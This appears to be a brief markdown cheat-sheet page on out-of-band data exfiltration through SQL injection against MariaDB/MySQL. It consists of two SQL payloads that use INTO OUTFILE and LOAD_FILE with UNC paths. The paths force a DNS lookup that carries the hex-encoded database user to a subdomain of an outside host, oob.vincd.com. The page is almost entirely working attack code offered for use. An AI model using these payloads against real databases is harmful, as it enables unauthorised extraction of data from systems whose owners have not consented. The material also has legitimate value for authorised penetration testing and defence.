---
title: "MarioDB / MySQL"
description: "Tips to exfiltrate information from a MariaDB/MySQL database."
date: 25/12/2020
categories:
 - SQL
tags:
 - sql
 - SQL injection
 - oob
 - mariadb
 - mysql
---


## Out of Band data exfiltration

```sql
SELECT 'a' INTO OUTFILE CONCAT('\\\\', (SELECT HEX(CONCAT(user(), "\n"))), '.oob.vincd.com\\test.txt');
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT HEX(CONCAT(user(), "\n"))), '.oob.vincd.com\\test.txt'));
```
